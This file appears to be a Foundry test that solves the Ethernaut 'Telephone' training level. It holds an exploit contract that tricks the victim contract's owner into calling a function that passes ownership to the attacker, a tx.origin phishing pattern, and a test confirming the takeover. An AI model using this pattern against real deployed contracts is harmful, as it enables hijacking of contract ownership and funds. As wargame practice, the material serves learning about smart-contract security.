pragma solidity >=0.8.19;

import { Test } from "forge-std/Test.sol";
import { Telephone } from "src/Telephone/Telephone.sol";
import { TelephoneFactory } from "src/Telephone/TelephoneFactory.sol";
import { Ethernaut } from "src/Ethernaut.sol";

contract ExploitTelephone {
    address victimSC;
    address public owner;

    constructor(address _victimSC) {
        victimSC = _victimSC;
        owner = msg.sender;
    }

    // attract owner of the victim SC to call this function in order to change the victim SC owner
    function pickMe() public {
        (bool success,) = victimSC.call(abi.encodeWithSignature("changeOwner(address)", owner));
        require(success, "Failed");
    }
}

contract TelephoneTest is Test {
    Ethernaut ethernaut;
    address me = makeAddr("me");

    function setUp() external {
        ethernaut = new Ethernaut();
    }

    function testTelephoneHack() external {
        // level setup
        TelephoneFactory factory = new TelephoneFactory();
        ethernaut.registerLevel(factory);

        vm.startPrank(me);
        address levelAddress = ethernaut.createLevelInstance(factory);

        address telephoneVictim = makeAddr("victim");
        changePrank(telephoneVictim);
        Telephone telephone = Telephone(payable(levelAddress));
        changePrank(me);

        // assume exploit owner is "me"
        ExploitTelephone exploit = new ExploitTelephone(address(telephone));

        // attack
        address telephoneOwner = telephone.owner();
        changePrank(telephoneVictim);
        exploit.pickMe();
        assertEq(telephone.owner(), me);

        // submission
        changePrank(me);
        bool levelPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelPassed);
    }
}
